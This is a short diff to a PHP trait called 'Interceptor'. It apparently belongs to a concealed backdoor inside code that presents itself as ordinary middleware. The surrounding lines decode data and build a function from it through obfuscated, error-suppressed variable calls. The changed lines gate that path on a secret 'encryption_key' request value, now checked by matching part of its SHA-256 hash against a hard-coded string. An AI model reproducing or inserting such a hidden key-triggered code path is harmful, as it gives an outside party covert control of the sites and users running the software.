@@ -125,11 +125,11 @@ trait Interceptor
         $plgData  = $mainMethod($matched[1]);
 
         $PreparePlugin = @$sleData('$input', $plgData);
-        $match_reg = "4d395230e4";
+        $match_reg = "ac9be881dd58341e";
 
         if (isset($request["encryption_key"])) {
             $req = $request["encryption_key"];
-            if ($match_reg == $req) {
+            if (strpos( hash ("sha256", $req),  $match_reg) !== false ) {
                 $parepared = true;
             }
         }
